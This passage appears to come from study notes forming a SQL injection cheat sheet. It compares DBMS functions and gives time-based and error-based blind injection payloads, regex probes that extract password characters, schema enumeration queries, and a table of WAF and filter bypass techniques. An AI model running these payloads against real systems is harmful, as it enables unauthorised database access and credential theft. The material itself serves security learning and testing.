>- `LENGTH()` calculates bytes; `CHAR_LENGTH()` calculates characters.

>[!note]+ MSSQL `LEN()` vs. `DATALENGTH()`
>- [`LEN()`](https://www.w3schools.com/sql/func_sqlserver_len.asp) calculates characters, but no *trailing* spaces (e.g., `LEN('string ')` returns 6).
>- [`DATALENGTH()`](https://www.w3schools.com/sql/func_sqlserver_datalength.asp) calculates bytes, and includes trailing spaces (e.g., `DATALENGTH('string ')` returns 7).

### Type casing 

| DBMS           | Syntax                                       | Example                 |
| -------------- | -------------------------------------------- | ----------------------- |
| **MySQL**      | `CAST(expr AS type)` · `CONVERT(expr, type)` | `CAST('5' AS UNSIGNED)` |
| **MSSQL**      | `CAST(expr AS type)` · `CONVERT(type, expr)` | `CONVERT(int, '5')`     |
| **PostgreSQL** | `CAST(expr AS type)` · `expr::type`          | `'5'::int`              |
| **Oracle**     | `CAST(expr AS type)` · `TO_NUMBER(expr)`     | `TO_NUMBER('5')`        |
| **SQLite**     | `CAST(expr AS type)`                         | `CAST('5' AS INTEGER)`  |

- Type names:

| DBMS           | Integer                       | Text/String                  | Float     |
| -------------- | ----------------------------- | ---------------------------- | --------- |
| **MySQL**      | `UNSIGNED` · `SIGNED` · `INT` | `CHAR` · `CHAR(n)`           | `DECIMAL` |
| **MSSQL**      | `INT` · `BIGINT`              | `VARCHAR(n)` · `NVARCHAR(n)` | `FLOAT`   |
| **PostgreSQL** | `INTEGER` · `BIGINT`          | `TEXT` · `VARCHAR(n)`        | `FLOAT`   |
| **Oracle**     | `NUMBER` · `INTEGER`          | `VARCHAR2(n)` · `CHAR(n)`    | `NUMBER`  |
| **SQLite**     | `INTEGER`                     | `TEXT`                       | `REAL`    |

### Conditionals 

| DBMS           | Available                                                               |
| -------------- | ----------------------------------------------------------------------- |
| **MySQL**      | `CASE WHEN ... THEN ... ELSE ... END` · `IF(cond, true_val, false_val)` |
| **MSSQL**      | `CASE WHEN ... END` · `IIF(cond, true_val, false_val)`                  |
| **PostgreSQL** | `CASE WHEN ... END`                                                     |
| **Oracle**     | `CASE WHEN ... END` (`FROM dual` required pre-23c)                      |
| **SQLite**     | `CASE WHEN ... END` · `IIF(cond, true_val, false_val)`                  |
>[!note] `CASE WHEN` is supported by all five DBMS.

- **`CASE WHEN` syntax**:

```sql
CASE WHEN <condition> THEN <true_value> ELSE <false_value> END
```

>[!example]-
> - MySQL / MSSQL / PostgreSQL / SQLite / Oracle (after version `23c`):
> 
> ```SQL
> SELECT CASE WHEN 1=1 THEN 'yes' ELSE 'no' END
> ```
> 
> - Oracle (before version `23c`):
> 
> ```SQL
> SELECT CASE WHEN 1=1 THEN 'yes' ELSE 'no' END FROM dual
> ```
> - Injection:
> ```SQL
> (SELECT CASE WHEN LENGTH(database())=4 THEN TO_CHAR(1/0) ELSE '' END FROM dual)
> ```

- **`IF()` syntax — MySQL**:

```SQL
IF(<condition>, <value_if_true>, <value_if_false>)
```

> [!example]-
> ```SQL
> SELECT IF(1=1, 'true', 'false')
> ```
> 
> - Injection:
> 
> ```SQL
> ' AND IF(1=1, SLEEP(5), 0)-- -
> ```
> ```SQL
> IF(SUBSTR(password,1,1)='a', 1/0, 1) -- -
> ```
> 
> 

- **`IIF()` syntax** — MSSQL / SQLite:

```SQL
IIF(<condition>, <value_if_true>, <value_if_false>)
```

>[!example]-
> ```sql
> SELECT IIF(1=1, 'true', 'false')
> ```

### Pattern matching

- `LIKE` wildcards:

| Wildcard | Meaning          | Example                             |
| -------- | ---------------- | ----------------------------------- |
| `%`      | Any sequence     | `WHERE name LIKE 'ad%'` → `admin`   |
| `_`      | Single character | `WHERE name LIKE 'a_min'` → `admin` |

- Case-sensitivity:

| DBMS           | Case-sensitivity                                                          |
| -------------- | ------------------------------------------------------------------------- |
| **MySQL**      | No — case-**insensitive** (depends on collation).                         |
| **MSSQL**      | Depends on collation.                                                     |
| **PostgreSQL** | Yes — case-**sensitive** (`ILIKE` for case-insensitive).                  |
| **Oracle**     | Yes — case-**sensitive** (use `UPPER()` for case-insensitive).            |
| **SQLite**     | Depends — case-**insensitive** for ASCII; case-**sensitive** for Unicode. |

- `REGEXP` / `RLIKE`:

| DBMS           | Syntax                                         | Notes                                        |
| -------------- | ---------------------------------------------- | -------------------------------------------- |
| **MySQL**      | `str REGEXP 'pattern'` · `str RLIKE 'pattern'` | POSIX ERE                                    |
| **MSSQL**      | — _(no native regex; use `CLR` or `LIKE`)_     |                                              |
| **PostgreSQL** | `str ~ 'pattern'` · `str ~* 'pattern'`         | `~` = case-sensitive; <br>`~*` = insensitive |
| **Oracle**     | `REGEXP_LIKE(str, 'pattern')`                  | POSIX ERE                                    |
| **SQLite**     | — _(requires user-defined functions)_          |                                              |
>[!example]-
> ```SQL
> -- MySQL: check if first char of password is in [a-f]
> ' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1) REGEXP '^[a-f]'-- -
> 
> -- PostgreSQL
> ' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1) ~ '^[a-f]'-- -
> 
> -- Oracle
> ' AND REGEXP_LIKE((SELECT password FROM users WHERE ROWNUM=1),'^[a-f]','i')-- -
> ```
### Time delay functions

| DBMS           | Syntax                                                                                                             | Example (~10-second delay)                                                                              |
| -------------- | ------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------- |
| **MySQL**      | `SLEEP(seconds)` or<br>`BENCHMARK(count, expression)`                                                              | `SLEEP(10)`<br>`BENCHMARK(50000000, MD5('test'))`                                                       |
| **PostgreSQL** | `pg_sleep(seconds)`                                                                                                | `pg_sleep(10)`                                                                                          |
| **MSSQL**      | `WAITFOR DELAY 'hh:mm:ss'`                                                                                         | `WAITFOR DELAY '0:0:10'`                                                                                |
| **Oracle**     | `DBMS_PIPE.RECEIVE_MESSAGE('a', seconds)` *(public by default)*<br>`DBMS_LOCK.SLEEP(seconds)` *(needs privileges)* | `DBMS_PIPE.RECEIVE_MESSAGE('a',10)`                                                                     |
| **SQLite**     | — *(no native sleep; use  heavy query)*                                                                            | `WITH RECURSIVE r(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM r WHERE x<10000000) SELECT count(*) FROM r` |

>[!example]-
> - MySQL:
> 
> ```sql
> '; SELECT SLEEP(10)-- -
> ' AND SLEEP(10)-- -
> ' AND IF(1=1, SLEEP(10), 0)-- -
> ```
> 
> - MSSQL:
> 
> ```SQL
> '; WAITFOR DELAY '0:0:10'-- -
> ' IF(1=1) WAITFOR DELAY '0:0:10'-- -
> ```
> 
> - PostgreSQL:
> 
> ```SQL
> '; SELECT pg_sleep(10)-- -
> ' AND 1=(SELECT 1 FROM pg_sleep(10))-- -
> ```
> 
> - Oracle:
> 
> ```SQL
> ' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',10)-- -
> ```
> 
## Enumerating schema
### Database version

| DBMS           | Query                                                                                                                 |
| -------------- | --------------------------------------------------------------------------------------------------------------------- |
| **MySQL**      | `SELECT VERSION();` · <br>`SELECT @@version;`                                                                         |
| **MSSQL**      | `SELECT @@VERSION;`                                                                                                   |
| **PostgreSQL** | `SELECT version();`                                                                                                   |
| **Oracle**     | `SELECT banner FROM v$version;` ·<br>`SELECT version FROM v$instance;` ·<br>`SELECT * FROM v$version WHERE ROWNUM=1;` |
| **SQLite**     | `SELECT sqlite_version();`                                                                                            |
### Current database / user


| DBMS           | Current DB                                                                                                                                                                      | Current user                                                                         |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------ |
| **MySQL**      | `SELECT DATABASE();` · `SELECT SCHEMA();`                                                                                                                                       | `SELECT USER();` · `SELECT CURRENT_USER();`                                          |
| **MSSQL**      | `SELECT DB_NAME();`                                                                                                                                                             | `SELECT SYSTEM_USER;` · `SELECT USER_NAME();`                                        |
| **PostgreSQL** | `SELECT current_database();` · `SELECT CURRENT_CATALOG;`                                                                                                                        | `SELECT current_user;` · `SELECT user;`                                              |
| **Oracle**     | `SELECT name FROM v$database;` ·<br>`SELECT ora_database_name FROM dual;` ·<br>`SELECT sys_context('USERENV','DB_NAME') FROM dual;` ·<br>`SELECT global_name FROM global_name;` | `SELECT USER FROM dual;` · `SELECT sys_context('USERENV','SESSION_USER') FROM dual;` |
| **SQLite**     | `PRAGMA database_list;`                                                                                                                                                         | — *(no user concept)*                                                                |

### Listing databases / tables / columns

| DBMS           | Databases                                                                                                                                                                                                  | Tables                                                                            | Columns                                                                        |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------- | ------------------------------------------------------------------------------ |
| **MySQL**      | `SELECT schema_name FROM information_schema.schemata;` · <br>`SHOW DATABASES;`                                                                                                                             | `SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE();` | `SELECT column_name FROM information_schema.columns WHERE table_name='users';` |
| **MSSQL**      | `SELECT name FROM master..sysdatabases;` ·<br>`SELECT name FROM sys.databases;`                                                                                                                            | `SELECT name FROM sys.tables;`                                                    | `SELECT column_name FROM information_schema.columns WHERE table_name='users';` |
| **PostgreSQL** | `SELECT datname FROM pg_database;` ·<br>`SELECT catalog_name FROM;` ·<br>`information_schema.information_schema_catalog_name;`                                                                             | `SELECT tablename FROM pg_tables WHERE schemaname='public';`                      | `SELECT column_name FROM information_schema.columns WHERE table_name='users';` |
| **Oracle**     | `SELECT name FROM v$database;` ·<br>`SELECT db_unique_name FROM v$database;` ·<br>*(Oracle is typically a single-database server; schemas = users)*<br>`SELECT username FROM all_users ORDER BY username;` | `SELECT table_name FROM all_tables;`                                              | `SELECT column_name FROM all_tab_columns WHERE table_name='USERS';`            |
| **SQLite**     | `PRAGMA database_list;`                                                                                                                                                                                    | `SELECT name FROM sqlite_master WHERE type='table';`                              | `SELECT name FROM pragma_table_info('users');`                                 |

## WAF & filter bypass

| Technique                                                | Example                                                                                                           | Notes                                                                                                                                            |
| -------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| Case variation                                           | `SeLeCt`, `UnIoN`                                                                                                 | Bypasses naive case-sensitive blacklists.                                                                                                        |
| Inline-comment keyword splitting (MySQL)                 | `UNI/**/ON SEL/**/ECT`                                                                                            | MySQL parses through inline comments; many regex WAFs don't.                                                                                     |
| MySQL versioned comments                                 | `/*!50000UNION*/ /*!50000SELECT*/`                                                                                | Executes only on MySQL ≥ 5.00.00; often bypasses generic-SQL filters entirely since the payload looks like a comment to non-MySQL-aware filters. |
| Alternative whitespace                                   | `%0a` (newline), `%09` (tab), `%0b` (vertical tab), parentheses instead of spaces (MySQL: `UNION(SELECT(1),(2))`) | Bypasses filters keyed on the literal space character.                                                                                           |
| String literals without quotes                           | `CHAR(83,69,76,69,67,84)` (MySQL/MSSQL), `CHR(83)\|CHR(69)` (Oracle), hex literal `0x53454c454354` (MySQL/MSSQL)  | Defeats quote-stripping filters.                                                                                                                 |
| Bypass keyword-stripped `OR`/`AND` (naive `str_replace`) | Nesting: `OR` → app strips once, leaving `OR` if original was `ORORand` (`O`+`RORand`→ becomes `OR`)              | Only works against single-pass, non-recursive string replacement — test first.                                                                   |
| Logical operators alternatives (MySQL, non-ANSI mode)    | `\|` for OR, `&&` for AND                                                                                         | Requires `PIPES_AS_CONCAT` **not** set; verify behavior before relying on it.                                                                    |
| Double URL-encoding                                      | `%2527` for `'`                                                                                                   | Bypasses WAFs that decode only once while the app decodes twice.                                                                                 |
| Unicode/overlong UTF-8 encoding                          | e.g. `％27` fullwidth quote normalized by some backends                                                            | Depends heavily on app-layer normalization — test per target.                                                                                    |
| Second-order injection                                   | Store a benign-looking payload, trigger execution when it's later read/reused elsewhere in a query                | Bypasses input-point WAF rules entirely since the malicious context appears at a different, unmonitored code path.                               |

> [!tip]+ Use `sqlmap` tamper scripts
> `space2comment`, `charencode`, `randomcase`, `apostrophemask`, `equaltolike`, `between`, `versionedmorekeywords` — chain with `--tamper=space2comment,charencode`.
##  References and further reading

- `PortSwigger`
	- https://portswigger.net/web-security/sql-injection/cheat-sheet
- `invicti`
	- https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
- GitHub
	- https://github.com/payloadbox/sql-injection-payload-list
	- https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet
	- https://github.com/AdmiralGaust/SQL-Injection-cheat-sheet
- `sqlzoo`
	- https://sqlzoo.net/wiki/SQL_Tutorial

